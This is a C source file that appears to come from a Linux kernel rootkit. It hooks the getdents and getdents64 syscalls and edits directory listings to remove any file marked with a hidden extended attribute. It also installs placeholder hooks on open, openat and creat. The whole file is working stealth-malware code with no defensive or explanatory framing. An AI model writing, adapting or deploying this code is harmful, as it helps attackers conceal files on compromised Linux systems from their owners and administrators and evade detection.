#include "file_hiding.h"

#include <linux/syscalls.h>
#include <asm/unistd.h>
#include <linux/xattr.h> //vfs_getxattr
#include <linux/dirent.h>
#include <linux/fdtable.h> // struct file
#include <linux/dcache.h> // d_path
#include <linux/limits.h> // PATH_MAX
#include <linux/namei.h> // kern_path
#include <linux/fcntl.h> // AT_FDCWD

#include "syscall_hooking.h"
#include "shared.h"

#define BIT32 0
#define BIT64 1

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_open;
static t_syscall orig_openat;
static t_syscall orig_creat;

//TODO hook open/openat/creat

static asmlinkage long hooked_creat(const struct pt_regs *pt_regs) {
    return orig_creat(pt_regs);
}

static asmlinkage long hooked_openat(const struct pt_regs *pt_regs) {
    return orig_openat(pt_regs);
}

static asmlinkage long hooked_open(const struct pt_regs *pt_regs) {
    return orig_open(pt_regs);
}

static long getdents_helper(const struct pt_regs *pt_regs, int mode) {

    int ret;
    char *buf = NULL, *path, *full_path = NULL;
    struct file *current_dir;
    unsigned int offset;
    unsigned long _ret;
    struct linux_dirent64 *dirp64 = NULL, *kdirent64 = NULL;
    struct linux_dirent *dirp = NULL, *kdirent = NULL;

    /*
     * Call original syscall
     *
     * End of directory = 0, error < 0
     */
    if (0 >= (ret = mode == BIT64 ? orig_getdents64(pt_regs) : orig_getdents(pt_regs))) {
        return ret;
    }

    /*
     * Get path of current directory
     *
     * pt_regs->di contains fd
     */
    if (NULL == (buf = kmalloc(PATH_MAX, GFP_KERNEL))) {
        return ret;
    }
    current_dir = fcheck(pt_regs->di);
    if (NULL == current_dir) {
        goto ret_label;
    }
    path = d_path(&current_dir->f_path, buf, PATH_MAX);


    /*
     * Get user directory entries
     */
    if (mode == BIT64) {
        dirp64 = (struct linux_dirent64 *) pt_regs->si;

        if (NULL == (kdirent64 = kmalloc(ret, GFP_KERNEL))) {
            goto ret_label;
        }

        if (0 != copy_from_user(kdirent64, dirp64, ret)) {
            goto ret_label;
        }
    } else {
        dirp = (struct linux_dirent *) pt_regs->si;

        if (NULL == (kdirent = kmalloc(ret, GFP_KERNEL))) {
            goto ret_label;
        }

        if (0 != copy_from_user(kdirent, dirp, ret)) {
            goto ret_label;
        }
    }

    /*
     * Loop over all directory entries
     *
     * full_path will contain the absolute path to the current directory entry
     */
    offset = 0;
    if (NULL == (full_path = kmalloc(PATH_MAX, GFP_KERNEL))) {
        goto ret_label;
    }

    while (offset < ret) {
        struct path f_path;
        char xattr_buf[32];
        struct linux_dirent64 *current_dirent64, *prev_dirent64;
        struct linux_dirent *current_dirent, *prev_dirent;

        /*
         * Construct the complete file path
         * dir_path + '/' + file_name
         */
        if (mode == BIT64) {
            current_dirent64 = (void *) kdirent64 + offset;
        } else {
            current_dirent = (void *) kdirent + offset;
        }
        memset(full_path, 0, PATH_MAX);
        memcpy(full_path, path, strlen(path));
        strcat(full_path, "/");
        strcat(full_path, mode == BIT64 ? current_dirent64->d_name : current_dirent->d_name);

        /*
         * Get the corresponding path struct, which contains the dentry
         */
        if (kern_path(full_path, 0x0001, &f_path)) {
            // cannot get path
            goto next;
        }

        /*
         * Check of xattr via the dentry
         */
        if (0 <= vfs_getxattr(f_path.dentry, HIDDEN_XATTR, &xattr_buf, sizeof(xattr_buf))) {
            // hide this
            if (offset == 0) {
                // first entry, make next entry the first one
                ret -= mode == BIT64 ? current_dirent64->d_reclen : current_dirent->d_reclen;
                if (mode == BIT64) {
                    memmove(current_dirent64, (void *) current_dirent64 + current_dirent64->d_reclen, ret);
                } else {
                    memmove(current_dirent, (void *) current_dirent + current_dirent->d_reclen, ret);
                }
                continue; //skip increasing offset since we have a new first entry
            } else if (mode == BIT64) {
                // skip current_entry, prev_dirent is always set when offset not zero
                prev_dirent64->d_reclen += current_dirent64->d_reclen;
            } else {
                prev_dirent->d_reclen += current_dirent->d_reclen;
            }
        } else if (mode == BIT64) {
            // do not hide
            prev_dirent64 = current_dirent64;
        } else {
            prev_dirent = current_dirent;
        }

next:
        offset += mode == BIT64 ? current_dirent64->d_reclen : current_dirent->d_reclen;
    }

    /*
     * Move modified directory entry to user
     */
    if (mode == BIT64) {
        _ret = copy_to_user(dirp64, kdirent64, ret);
    } else {
        _ret = copy_to_user(dirp, kdirent, ret);
    }

ret_label:
    kfree(full_path);
    kfree(kdirent64);
    kfree(kdirent);
    kfree(buf);
    return ret;
}

static asmlinkage long hooked_getdents(const struct pt_regs *pt_regs) {
    return getdents_helper(pt_regs, BIT32);
}

static asmlinkage long hooked_getdents64(const struct pt_regs *pt_regs) {
    return getdents_helper(pt_regs, BIT64);
}

void enable_file_hiding(void) {

    /*
     * Store original syscalls
     */
    orig_getdents = (t_syscall) get_original_syscall(__NR_getdents);
    orig_getdents64 = (t_syscall) get_original_syscall(__NR_getdents64);
    orig_openat = (t_syscall) get_original_syscall(__NR_openat);
    orig_open = (t_syscall) get_original_syscall(__NR_open);
    orig_creat = (t_syscall) get_original_syscall(__NR_creat);

    /*
     * Hook syscalls
     */
    add_syscall_hook(__NR_getdents, (unsigned long *) hooked_getdents);
    add_syscall_hook(__NR_getdents64, (unsigned long *) hooked_getdents64);
    add_syscall_hook(__NR_openat, (unsigned long *) hooked_openat);
    add_syscall_hook(__NR_open, (unsigned long *) hooked_open);
    add_syscall_hook(__NR_creat, (unsigned long *) hooked_creat);

}

void disable_file_hiding(void) {

    /*
     * Unhook syscalls
     */
    rm_syscall_hook(__NR_getdents);
    rm_syscall_hook(__NR_getdents64);
    rm_syscall_hook(__NR_openat);
    rm_syscall_hook(__NR_open);
    rm_syscall_hook(__NR_creat);

}
